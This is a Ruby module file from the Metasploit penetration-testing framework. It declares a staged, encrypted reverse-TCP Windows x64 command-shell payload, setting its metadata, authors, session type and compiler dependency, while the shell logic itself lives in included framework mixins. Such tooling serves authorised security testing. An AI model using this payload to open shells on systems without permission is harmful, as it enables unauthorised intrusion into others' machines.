##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Windows
  include Msf::Sessions::CommandShellOptions
  include Msf::Payload::Windows::EncryptedReverseTcp
  include Msf::Payload::Windows::EncryptedPayloadOpts

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows Command Shell',
        'Description' => 'Spawn a piped command shell (staged)',
        'Author' => [
          'Matt Graeber',
          'Shelby Pace'
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X64,
        'Session' => Msf::Sessions::EncryptedShell,
        'Dependencies' => [ Metasploit::Framework::Compiler::Mingw::X64 ],
        'PayloadCompat' => { 'Convention' => 'sockedi' }
      )
    )
  end
end
